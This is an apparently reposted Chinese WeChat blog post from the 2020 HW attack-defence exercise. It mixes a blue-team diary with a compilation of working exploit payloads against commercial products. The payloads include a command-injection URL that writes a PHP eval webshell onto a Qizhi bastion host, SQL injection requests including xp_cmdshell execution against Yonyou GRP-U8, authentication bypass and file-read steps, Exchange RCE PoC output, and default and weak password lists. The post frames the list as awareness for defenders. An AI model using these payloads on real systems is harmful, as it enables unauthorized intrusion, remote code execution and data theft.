@@ -1,0 +1,255 @@
+\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/6n4OkLF\_QLFyewkF1mh3eQ)
+
+0912HW 日报  
+
+蹲守机房的第二天，机房很冷，冷的要命，尤其临近饭点还有点饥寒交迫的感觉。但是不敢松懈，要提醒自己时刻保持警惕，随时等候拔线的指令。  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmjgiajk3ForAicqK8FGJ39EdL2l3qoR81JqhMTauT71x0A0LUjXFyEfFJtQPic6JWa29JibxfRiaF3ibOA/640?wx_fmt=png)
+
+今天很安静，但是请别大意![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icmjgiajk3ForAicqK8FGJ39EdpAeiaEibU7gojHf1tJlLiaAjZkv38alib2rKEJ2LGgliaSPRWIAUEgrfrzg/640?wx_fmt=png)  
+
+今天 ，你拔线了么？
+
+以下转载自：渗了个透  
+
+《HW 平安夜: 09/11 漏洞 PAYlOAD》  
+
+《HW 平安夜: 09/12 态势感知》
+
+0、齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）
+
+未授权无需登录。
+
+1、访问 http://10.20.10.11/listener/cluster\_manage.php  : 返回 "OK".
+
+2、访问如下链接即可 getshell，执行成功后，生成 PHP 一句话马
+
+3、/var/www/shterm/resources/qrcode/lbj77.php  密码 10086
+
+```
+https://10.20.10.10/ha\_request.php?action=install&ipaddr=10.20.10.11&node\_id=1${IFS}|\`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash\`|${IFS}|echo${IFS}
+
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicE8UEGQJf3VVPU2ia5LUic9mXWTdoiahWDSITepRuyI9wiaxRkN4SbJCGuMw/640?wx_fmt=png)
+
+这里假设 10.20.10.10 为堡垒机的 IP 地址。  
+
+1、天融信 TopApp-LB 负载均衡系统 Sql 注入漏洞
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicE5AW12sTdkdtvHSEv3NVLFuWUKYIIb0hpMUGvsbb6RAdN5vU7UvlL3A/640?wx_fmt=png)
+
+```
+POST /acc/clsf/report/datasource.php HTTP/1.1
+Host: localhost
+Connection: close
+Accept: text/javascript, text/html, application/xml, text/xml, \*/\*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/x-www-form-urlencoded
+t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r\_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。
+
+```
+
+网友称以下两个历史漏洞仍然可以复现。
+
+https://www.uedbox.com/post/21626/
+
+https://www.uedbox.com/post/22193/
+
+2、用友 GRP-u8 注入
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicEYiaZjXJQic5ic25SpakRvPOZJQSE1R9xsico6E92XYHIMHVRLWVFfDdKyg/640?wx_fmt=png)
+
+```
+POST /Proxy HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
+Host: localhost
+Content-Length: 341
+Connection: Keep-Alive
+Cache-Control: no-cache
+cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS\_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp\_cmdshell 'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+
+```
+
+3、绿盟 UTS 综合威胁探针管理员任意登录
+
+逻辑漏洞, 利用方式参考（https://www.hackbug.net/archives/112.html）
+
+1、修改登录数据包 {"status":false,"mag":""} -> {"status":true,"mag":""}
+
+2、/webapi/v1/system/accountmanage/account 接口逻辑错误泄漏了管理员的账户信息包括密码（md5）
+
+3、再次登录, 替换密码上个数据包中 md5 密码。
+
+4、登录成功。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7T9XJ4Tib6MVshTVmOUYpcicEs9o9BvmL5xm2ODFNYQicqVI8BO6ZyckvKNL39riajCVzArUBJgASE76Q/640?wx_fmt=png)
+
+4、WPS Office 图片解析错误导致堆损坏，任意代码执行。
+
+看上去 (算了看不懂... , 漏洞利用可能导致拒绝服务。
+
+相关参考:
+
+http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html
+
+以上内容均为网友分享, 作者并未实际复现。  
+
+5、「最新」泛微 OA 云桥任意文件读取  
+
+来源: 微步情报局
+
+未授权任意文件读取,/wxjsapi/saveYZJFile 接口获取 filepath, 返回数据包内出现了程序的绝对路径, 攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。  
+
+1、 downloadUrl 参数修改成需要获取文件的绝对路径, 记录返回包中的 id 值。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKpmtXbajxJeCjHCBYqpibImvE1DOSubqOjI9tXr1q5XPibbsFJzsI89RQ/640?wx_fmt=png)
+
+2、通过查看文件接口访问 /file/fileNoLogin/id
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQK9pcoRWC2r3Hp58NZx3BPJbmqC0iaKsZ4zBsCiaqNHvK1trtsC0ZQS15g/640?wx_fmt=png)
+
+修复建议:
+
+关闭程序路由 /file/fileNoLogin
+
+6、宝塔面板 phpMyadmin 未授权访问  
+
+来源: https://mp.weixin.qq.com/s/3ZjwFo5gWlJACSkeYWQLXA
+
+前段时间在朋友圈和微信群里火热不行的宝塔数据库面板未授权无需登录, 以下是存在安全问题的版本。
+
+\- Linux 正式版 7.4.2
+
+\- Linux 测试版 7.5.13
+
+\- Windows 正式版 6.8
+
+1、宝塔默认 phpMyadmin 端口就是 888 而这个漏洞排查方式极其简单 172.10.0.121:888/pma
+
+2、如果宝塔是存在安全问题的版本, 那就会直接出现 phpMyadmin 面板页面。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKlZ5KxHEfv4DGQ8UWegJPGjFlWpkOMOO6XTnwRzfjyYtD6plP4qNQlg/640?wx_fmt=png)
+
+7、CVE-2020-16875: Exchange Server 远程代码执行漏洞
+
+更新公告:https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875
+
+微软公告说的很明显, 只需要一个 Exchange 用户账号。就能在 Exchange 服务器上执行任意命令。
+
+https://srcincite.io/pocs/cve-2020-16875.py.txt
+
+https://srcincite.io/pocs/cve-2020-16875.ps1.txt
+
+```
+researcher@incite:~$ ./poc.py
+(+) usage: ./poc.py <target> <user:pass> <cmd>
+(+) eg: ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint
+
+researcher@incite:~$ ./poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint
+(+) logged in as harrym@exchangedemo.com
+(+) found the \_\_viewstate: /wEPDwUILTg5MDAzMDFkZFAeyPS7/eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5
+
+
+(+) triggered rce as SYSTEM!
+
+
+
+
+```
+
+8、PhpStudy nginx 解析漏洞  
+
+小皮面板 <= 8.1.0.7: 啊这。不是吧不是吧, 这都能甩锅到我头上。我裂开了呀!
+
+其实这个漏洞确实不是小皮的问题, 而是 2017 年就出现的 nginx 解析漏洞。
+
+1、利用条件就只需要把 php 恶意文件上传 (oss 不算!) 到服务器。
+
+<?php phpinfo();?>
+
+2、通过 /x.txt/x.php 方式访问上传的图片地址, 啪嚓! 就解析了 php 代码。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKPGibibvVn6etYeoJOYISqJzqpYYL6xfndBkp2zIhD5fY6B6U7xdLS6Nw/640?wx_fmt=png)
+
+9、一些弱口令字典  
+
+使用范围不限于系统服务、应用服务、应用程序, 可以用这些生成字典对内网资产巡检。
+
+泛微 OA 默认 system 账号: system/system
+
+Apache DolphinScheduler: admin/dolphinscheduler
+
+1、账号
+
+admin@admin.com  
+
+superadmin
+
+admin123
+
+xadmin
+
+system
+
+admin
+
+root
+
+2、密码
+
+$companyName$@2020  
+
+$companyName$2020
+
+$companyName$123
+
+admin123
+
+12345678
+
+123456
+
+admin
+
+root
+
+为啥没写 administrators, 因为上面都是我随便想出来的, 这个我记不住。
+
+回顾一下 HW 2020/09/11:
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKVQ33b3TcgR74H7JsbeJ1F9CxNlx6hzhzk1oXazRCLSmO6tVgPdaEVw/640?wx_fmt=png)
+
+第一天都有陆续爆出很多安全厂商安全漏洞, 其中大部分都是历史漏洞, 这些高危问题简直就是能够一步到位, 直接打进内网, 所以我们也安排小编把这些漏洞贴放出来, 让甲方也能注意一下这些问题。
+
+虽然是历史漏洞也不排除客户没有做到全面的升级, 正好也可以排查一遍。  
+
+还有消息说是蜜罐失守, 直接被打出局了 // 不管是不是真假做好相关措施总是对的。  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQK3qAModXk9a928CkjJqvEI6Rib02ibkbFr3aJvR3ZnwGPmNSkOLoJEibjg/640?wx_fmt=png)
+
+hw 开始之前有很多人都进了 “协同 banIP 蓝队都是第 1” 这种群组团 ban 红队 IP, 让红队的哥哥们属实没有劲。
+
+但是给组团归组团, 内部机密文件一定不要发到这些群里去啦, 不然可就要卷铺盖走人啦。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKq75FdRTmx1uNxBxekXI5CibfvjyRv6w8fqotXDBbR6pJDVk7P26pxKw/640?wx_fmt=png)
+
+最后还是要劝大家保重身体, 尽量别超负荷工作。
+
+多喝菊花茶, 对胃好![](https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKEJlPjibYxsa5VONQUrgZq3tKDU5BJmpv8ia4iaicckKJn78icfCCf9fN6fg/640?wx_fmt=png)。
+
+往期文章推荐：  
+
+[2020HW 小技巧总结（献上本人收藏多年的子域名字典）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491498&idx=1&sn=a89632ba8f23ae767ab9601b2b9aaac2&chksm=f9e070f1ce97f9e77e29c1480054c6b26294c51151c9103d1649a3a40e2426db0c54b9760fd4&scene=21#wechat_redirect)
+
+[2020HW 红方漏洞利用总结（一）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491498&idx=2&sn=14df154e315eab42249f291197592755&chksm=f9e070f1ce97f9e7db17cf6a07a8a5018dfdd84937169ad5fa16733997311145f1f4dadfe361&scene=21#wechat_redirect)
+
+[hvv 最新情报](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491498&idx=3&sn=5dd619a5b6de85813e078ee7c2b9fef6&chksm=f9e070f1ce97f9e705b8379de33c7e1099ab4388461677171390058f820dc63112a5e8324d2f&scene=21#wechat_redirect)
+
+[红队防猝死手册](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491378&idx=1&sn=ef1fc979764bf9fe7f2109e65295ccbb&chksm=f9e07069ce97f97fcb3003c42ba9d4070f2cea55a7c53b11e448b0a02173f5471744915449ff&scene=21#wechat_redirect)
+
+[红队渗透手册之信息收集篇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491314&idx=1&sn=76bf664dc5934fd148c0c8aebc4ae41a&chksm=f9e071a9ce97f8bf93b8e86ff891fc1594a05b30983d77cbeb05a8cb3e98d2271c28febfc388&scene=21#wechat_redirect)
+
+[HW 演习前的自我信息排查](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247491257&idx=1&sn=0cdf847f4a2c33825c782d521952e6b9&chksm=f9e071e2ce97f8f486f9d56576201efe90cbcaa42b6dee75169d6822c7c97c234b0843ccf07e&scene=21#wechat_redirect)
